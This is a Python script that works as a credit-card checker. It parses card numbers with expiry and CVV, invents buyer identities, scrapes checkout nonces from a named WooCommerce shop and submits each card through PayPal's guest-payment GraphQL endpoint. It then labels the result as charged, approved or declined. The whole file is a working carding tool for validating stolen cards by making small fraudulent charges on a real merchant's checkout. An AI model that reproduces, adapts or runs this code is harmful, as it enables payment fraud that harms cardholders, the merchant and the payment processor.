import aiohttp
import asyncio
import random
import string
import re
import json
import time

def get_card_details(card):
    parts = card.replace(" ", "").split("|")
    if len(parts) != 4:
        return None
    cc, mm, yy, cvv = parts
    mm = mm.zfill(2)
    if len(yy) == 4:
        yy = yy[2:]
    return cc, mm, yy, cvv

def random_email():
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=15)) + "@gmail.com"

def random_name():
    first = ["James","John","Michael","William","David","Robert","Thomas","Charles","Chris","Daniel"]
    last = ["Smith","Johnson","Williams","Brown","Jones","Garcia","Miller","Davis","Wilson","Anderson"]
    return random.choice(first), random.choice(last)

def random_address():
    data = [
        ("123 Main St", "New York", "NY", "10001"),
        ("456 Oak Ave", "Los Angeles", "CA", "90001"),
        ("789 Pine Rd", "Chicago", "IL", "60601"),
        ("321 Elm St", "Houston", "TX", "77001"),
        ("654 Maple Dr", "Phoenix", "AZ", "85001")
    ]
    return random.choice(data)

async def check_paypal_async(cc: str, mm: str, yy: str, cvv: str) -> dict:
    mm = mm.zfill(2)
    if len(yy) == 2:
        yy_full = yy
    elif len(yy) == 4:
        yy_full = yy[2:]
    else:
        yy_full = yy

    timeout = aiohttp.ClientTimeout(total=45)
    connector = aiohttp.TCPConnector(ssl=False)

    async with aiohttp.ClientSession(timeout=timeout, connector=connector) as session:
        try:
            await session.post(
                "https://switchupcb.com/shop/i-buy/",
                data={"add-to-cart": "4451", "quantity": "1"},
                headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"},
                ssl=False
            )

            r = await session.get("https://switchupcb.com/checkout/", ssl=False)
            text = await r.text()

            create_nonce = re.search(r'create_order.*?nonce":"([^"]+)"', text)
            checkout_nonce = re.search(r'name="woocommerce-process-checkout-nonce" value="([^"]+)"', text)
            if not create_nonce or not checkout_nonce:
                return {
                    'status': 'ERROR',
                    'response': 'Nonce not found',
                    'message': 'Failed to get checkout nonce'
                }

            create_nonce = create_nonce.group(1)
            checkout_nonce = checkout_nonce.group(1)

            first, last = random_name()
            street, city, state, zipcode = random_address()
            email = random_email()
            phone = "303" + "".join(random.choices(string.digits, k=7))

            payload = {
                "nonce": create_nonce,
                "bn_code": "Woo_PPCP",
                "context": "checkout",
                "order_id": "0",
                "payment_method": "ppcp-gateway",
                "funding_source": "card",
                "form_encoded": f"billing_first_name={first}&billing_last_name={last}&billing_country=US&billing_address_1={street}&billing_city={city}&billing_state={state}&billing_postcode={zipcode}&billing_phone={phone}&billing_email={email}&payment_method=ppcp-gateway&terms=on&woocommerce-process-checkout-nonce={checkout_nonce}"
            }

            async with session.post(
                "https://switchupcb.com/?wc-ajax=ppc-create-order",
                json=payload,
                headers={"Content-Type": "application/json", "Referer": "https://switchupcb.com/checkout/"},
                ssl=False
            ) as resp:
                data = await resp.json()
                order_id = data.get("data", {}).get("id")
                if not order_id:
                    return {
                        'status': 'ERROR',
                        'response': 'No order ID',
                        'message': 'Failed to create order'
                    }

            gql = {
                "query": """mutation payWithCard($token: String!, $card: CardInput!, $email: String, $billingAddress: AddressInput) {
                    approveGuestPaymentWithCreditCard(token: $token, card: $card, email: $email, billingAddress: $billingAddress) {
                        flags { is3DSecureRequired }
                    }
                }""",
                "variables": {
                    "token": order_id,
                    "card": {
                        "cardNumber": cc,
                        "expirationDate": f"{mm}/20{yy_full}",
                        "securityCode": cvv,
                        "postalCode": zipcode
                    },
                    "email": email,
                    "billingAddress": {
                        "givenName": first,
                        "familyName": last,
                        "line1": street,
                        "city": city,
                        "state": state,
                        "postalCode": zipcode,
                        "country": "US"
                    }
                },
                "operationName": "payWithCard"
            }

            async with session.post(
                "https://www.paypal.com/graphql",
                json=gql,
                headers={
                    "Content-Type": "application/json",
                    "Origin": "https://www.paypal.com",
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
                },
                ssl=False
            ) as resp:
                result = await resp.json()

            txt = json.dumps(result).lower()

            if "thank you for your donation" in txt or "success" in txt:
                return {
                    'status': 'CHARGED',
                    'response': 'Charge $1',
                    'message': 'Charged $1'
                }
            elif "is3dsecurerequired" in txt:
                return {
                    'status': 'APPROVED',
                    'response': 'VBV/3DS',
                    'message': 'CVV Match - 3D Secure Required'
                }
            elif "incorrect_cvv" in txt or "invalid_security_code" in txt:
                return {
                    'status': 'APPROVED',
                    'response': 'CCN Mismatch',
                    'message': 'CVV Match - CCN Mismatch'
                }
            elif "insufficient_funds" in txt:
                return {
                    'status': 'APPROVED',
                    'response': 'Insufficient Funds',
                    'message': 'CVV Match - Insufficient Funds'
                }
            elif "do_not_honor" in txt or "processor_declined" in txt or "issuer_decline" in txt:
                return {
                    'status': 'DECLINED',
                    'response': 'Issuer Decline',
                    'message': 'Issuer Decline'
                }
            else:
                try:
                    err = result.get("errors", [{}])[0].get("message", "Unknown Error")
                    return {
                        'status': 'DECLINED',
                        'response': err[:50],
                        'message': f'{err[:50]}'
                    }
                except:
                    return {
                        'status': 'DECLINED',
                        'response': 'Unknown',
                        'message': 'Unknown Response'
                    }

        except Exception as e:
            return {
                'status': 'ERROR',
                'response': str(e)[:70],
                'message': f'Error: {str(e)[:70]}'
            }


def check_paypal(cc: str, mm: str, yy: str, cvv: str, retries: int = 0) -> dict:
    try:
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        result = loop.run_until_complete(check_paypal_async(cc, mm, yy, cvv))
        loop.close()
        return result
    except Exception as e:
        if retries < 2:
            time.sleep(2)
            return check_paypal(cc, mm, yy, cvv, retries + 1)
        return {
            'status': 'ERROR',
            'response': str(e)[:50],
            'message': f'Exception: {str(e)[:50]}'
        }
